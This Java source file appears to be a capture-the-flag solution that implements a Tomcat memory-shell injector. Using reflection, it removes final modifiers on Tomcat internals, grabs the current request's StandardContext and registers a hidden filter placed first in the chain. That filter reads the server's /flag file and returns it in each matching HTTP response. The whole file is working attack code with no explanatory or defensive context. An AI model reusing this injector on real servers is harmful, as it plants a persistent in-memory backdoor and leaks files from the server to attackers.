package msshell;


import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Map;

/**
 * @author wh1t3p1g
 * @since 2023/3/1
 */
public class TomcatFilterForD3ctf2 implements Filter {

    private static String uri;
    private static String filterName = "DefaultFilter";

    private static String data = "test";
    public TomcatFilterForD3ctf2(String uri){
    }

    public TomcatFilterForD3ctf2() {
        try{
            System.out.println("try to inject");
            ThreadLocal threadLocal = init();

            if (threadLocal != null && threadLocal.get() != null) {
                System.out.println("try to inject to request");
                ServletRequest servletRequest = (ServletRequest) threadLocal.get();
                ServletContext servletContext = servletRequest.getServletContext();

                ApplicationContext applicationContext = (ApplicationContext) getFieldObject(servletContext, servletContext.getClass(), "context");

                StandardContext standardContext = (StandardContext) getFieldObject(applicationContext, applicationContext.getClass(), "context");
                Map filterConfigs = (Map) getFieldObject(standardContext, standardContext.getClass(), "filterConfigs");

                if(filterConfigs.get(filterName) != null){
                    filterConfigs.remove(filterName); // 重新注册
                }

                TomcatFilterForD3ctf2 filter = new TomcatFilterForD3ctf2(uri);

                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilterClass(filter.getClass().getName());
                filterDef.setFilter(filter);
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern(uri);
                filterMap.setFilterName(filterName);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                filterConfigs.put(filterName, filterConfig);
                System.out.println("inject success");
            }

        }catch (Exception e){

        }
    }

    public ThreadLocal init() throws Exception{
        Class<?> applicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
        Field WRAP_SAME_OBJECT = getField(applicationDispatcher, "WRAP_SAME_OBJECT");
        Field modifiersField = getField(WRAP_SAME_OBJECT.getClass(), "modifiers");
        modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        if (!WRAP_SAME_OBJECT.getBoolean(null)) {
            WRAP_SAME_OBJECT.setBoolean(null, true);
        }

        //初始化 lastServicedRequest
        Class<?> applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        Field lastServicedRequest = getField(applicationFilterChain,"lastServicedRequest");
        modifiersField = getField(lastServicedRequest.getClass(),"modifiers");
        modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        if (lastServicedRequest.get(null) == null) {
            lastServicedRequest.set(null, new ThreadLocal<>());
        }

        //初始化 lastServicedResponse
        Field lastServicedResponse = getField(applicationFilterChain,"lastServicedResponse");
        modifiersField = getField(lastServicedResponse.getClass(),"modifiers");
        modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        if (lastServicedResponse.get(null) == null) {
            lastServicedResponse.set(null, new ThreadLocal<>());
        }

        return (ThreadLocal) getFieldObject(null, applicationFilterChain,"lastServicedRequest");
    }

    public static Object getFieldObject(Object obj, Class<?> cls, String fieldName){
        Field field = getField(cls, fieldName);
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static Field getField(Class<?> cls, String fieldName){
        Field field = null;
        try {
            field = cls.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (cls.getSuperclass() != null)
                field = getField(cls.getSuperclass(), fieldName);
        }
        return field;
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletResponse resp = (HttpServletResponse) response;
        String flag = new String(Files.readAllBytes(Paths.get("/flag")));
        String retData = "{" +
                "\"message\": \""+flag+"\"," +
                "\"code\": \"200\"" +
                "}";
        resp.getWriter().write(retData);
    }

    @Override
    public void destroy() {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

}
